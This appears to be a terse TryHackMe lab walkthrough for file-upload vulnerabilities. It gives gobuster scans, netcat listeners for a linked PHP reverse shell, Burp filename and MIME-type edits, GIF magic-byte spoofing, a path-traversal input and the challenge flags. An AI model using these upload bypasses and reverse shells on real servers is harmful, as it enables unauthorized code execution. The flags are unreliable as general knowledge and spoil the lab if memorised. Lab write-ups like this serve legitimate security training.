# THM - Upload Vulnerabilities

<br>

```shell
echo "10.10.198.71    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm" | sudo tee -a /etc/hosts
```

```shell
nano /etc/hosts
```

```text
C:\Windows\System32\drivers\etc
```

<br>

## Task 4

### Task 4.1

> mountains.jpg

### Task 4.2

> THM{OTBiODQ3YmNjYWZhM2UyMmYzZDNiZjI5}

<br>

## Task 5

🧰 https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

🧰 https://pentestmonkey.net/tools/web-shells/php-reverse-shell

### Task 5.1

```shell
gobuster dir -u http://shell.uploadvulns.thm/ -w ../../Tools/KaliWordlists/dirbuster/directory-list-2.3-medium.txt | tee output01_gobuster.txt
```

> /resources

### Task 5.2

```shell
nc -lvnp 9876
```

http://shell.uploadvulns.thm/resources/php-reverse-shell.php

```shell
cd /var/www
ls
cat flag.txt
```
> THM{YWFhY2U3ZGI4N2QxNmQzZjk0YjgzZDZk}

<br>

## Task 6

### Task 6.1

> php

### Task 6.2

> whitelist

### Task 6.3

🧰 https://stackoverflow.com/questions/7076042/what-mime-type-should-i-use-for-csv

> text/csv

<br>

## Task 7

### Task 7.1

```shell
gobuster dir -u http://java.uploadvulns.thm/ -w ../../Tools/KaliWordlists/dirbuster/directory-list-2.3-medium.txt | tee output02_gobuster.txt
```

http://java.uploadvulns.thm/

```text
# Burp Suite:
filename="php-reverse-shell.png"
Content-Type: image/png

# modify
filename="php-reverse-shell.php"
Content-Type: text/x-php
```

```shell
nc -lvnp 9876
```

http://java.uploadvulns.thm/images/php-reverse-shell.gif

```shell
cd /var/www
ls
cat flag.txt
```

> THM{NDllZDQxNjJjOTE0YWNhZGY3YjljNmE2}

<br>

## Task 8

http://annex.uploadvulns.thm/

### Task 8.1

```shell
gobuster dir -u http://annex.uploadvulns.thm/ -w ../../Tools/KaliWordlists/dirbuster/directory-list-2.3-medium.txt | tee output03_gobuster.txt
```

http://annex.uploadvulns.thm/privacy/

```shell
nc -lvnp 9876
```

http://annex.uploadvulns.thm/privacy/2022-08-10-16-50-35-php-reverse-shell.jpg.php5

```shell
cd /var/www
ls
cat flag.txt
```

> THM{MGEyYzJiYmI3ODIyM2FlNTNkNjZjYjFl}

<br>

## Task 9

http://magic.uploadvulns.thm/

### Task 9.1

```shell
gobuster dir -u http://magic.uploadvulns.thm/ -w ../../Tools/KaliWordlists/dirbuster/directory-list-2.3-medium.txt | tee output04_gobuster.txt
```

http://magic.uploadvulns.thm/graphics

```shell
hexeditor php-reverse-shell2.gif
```

🧰 https://en.wikipedia.org/wiki/List_of_file_signatures

```shell
47 49 46 38
```

```shell
nc -lvnp 9876
```

http://magic.uploadvulns.thm/graphics/php-reverse-shell2.php

```shell
cd /var/www
ls
cat flag.txt
```

> THM{MWY5ZGU4NzE0ZDlhNjE1NGM4ZThjZDJh}

<br>

## Task 11

http://jewel.uploadvulns.thm/

### Task 11.1

```shell
gobuster dir -u http://jewel.uploadvulns.thm/ -w ../../Tools/KaliWordlists/dirbuster/directory-list-2.3-medium.txt | tee output05_gobuster.txt
```

```shell
gobuster dir -u http://jewel.uploadvulns.thm/content -w UploadVulnsWordlist.txt -t 250 -x jpg | tee output06_gobuster.txt
```

```shell
gobuster dir -u http://jewel.uploadvulns.thm/content -w UploadVulnsWordlist.txt -t 250 -x jpg | tee output07_gobuster.txt
```

```shell
nc -lvnp 9876
```

http://jewel.uploadvulns.thm/admin

Input: ../content/RCR.jpg

```shell
pwd
cd ..
ls
cat flag.txt
```

> THM{NzRlYTUwNTIzODMwMWZhMzBiY2JlZWU2}


